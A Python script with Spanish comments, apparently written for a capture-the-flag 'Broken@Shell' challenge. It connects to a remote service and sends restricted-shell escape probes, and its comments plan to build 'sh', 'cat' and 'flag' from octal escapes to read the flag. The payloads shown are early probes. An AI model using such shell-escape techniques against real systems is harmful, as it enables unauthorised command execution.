#!/usr/bin/env python3
import socket
import time
import sys

host = "94.237.57.1"
port = 33017

def send_command(payload, desc=""):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        
        # Leer banner
        banner = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                banner += chunk
                if b"Broken@Shell" in banner and b"$ " in banner:
                    break
            except socket.timeout:
                break
        
        if desc:
            print(f"\n[*] {desc}")
        print(f"[+] Payload: {payload}")
        
        s.sendall(payload.encode() + b"\n")
        time.sleep(2)
        
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"$ " in chunk:
                    break
            except socket.timeout:
                break
        
        result = response.decode('utf-8', errors='ignore')
        print(result)
        s.close()
        return result
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Intentar construir sh usando octal en $''
# s = \163 (115), h = \150 (104)
# cat = \143\141\164 (99, 97, 116)
# ls = \154\163 (108, 115)
# flag = \146\154\141\147 (102, 108, 97, 103)

payloads = [
    # Octal para 'sh'
    ("$\"\"$\"\"$\"\"$\"\"", "Probar comillas vacías"),
    ("$\"\"$\"\"", "Probar ejecución con comillas vacías"),
]

for payload, desc in payloads:
    send_command(payload, desc)
    time.sleep(0.5)

